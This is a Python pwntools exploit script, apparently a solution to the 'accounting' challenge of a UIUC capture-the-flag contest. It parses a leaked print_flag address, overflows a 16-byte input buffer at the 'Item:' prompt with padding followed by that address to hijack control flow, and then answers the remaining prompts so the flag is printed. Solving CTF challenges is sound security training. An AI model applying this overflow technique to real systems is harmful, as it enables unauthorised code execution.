

from pwn import *
import re


# accounting: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2,
# for GNU/Linux 3.2.0, BuildID[sha1]=72ded94a52807f73d24ae7c72db8e29099a7bfc3, not stripped

# context.log_level = logging.DEBUG
context.endian = 'little'
context.word_size = 32
context.sign = False

conn = remote('chal.uiuc.tf', 2001)

line = conn.recvline().decode('ascii')
m = re.search(r'.* \{(0x[0-9a-fA-F]+)\}.*', line)
assert(m)
print_flag__addr = m.group(1)
print_flag__addr = int(print_flag__addr, 0)
log.info("print_flag function assumed at address: " + hex(print_flag__addr))

for i in range(6):
    conn.recvline()
conn.recvpred(lambda x: x.decode('ascii') == "Item: ")
conn.send(b'A'*0x10 + pack(print_flag__addr))

conn.recvpred(lambda x: x.decode('ascii').endswith("Shrub Trimming Cost: "))
conn.send(b'23')

conn.recvpred(lambda x: x.decode('ascii').endswith("Raymond Hush $$ Cost: "))
conn.send(b'28')

conn.recvpred(lambda x: x.decode('ascii').endswith("Town Hall Food Cost: "))
conn.send(b'29')

conn.recvpred(lambda x: x.decode('ascii').endswith("New Wall Art Cost: "))
conn.send(b'5')

d = conn.recvall()
print(d.decode('ascii'))

conn.close()
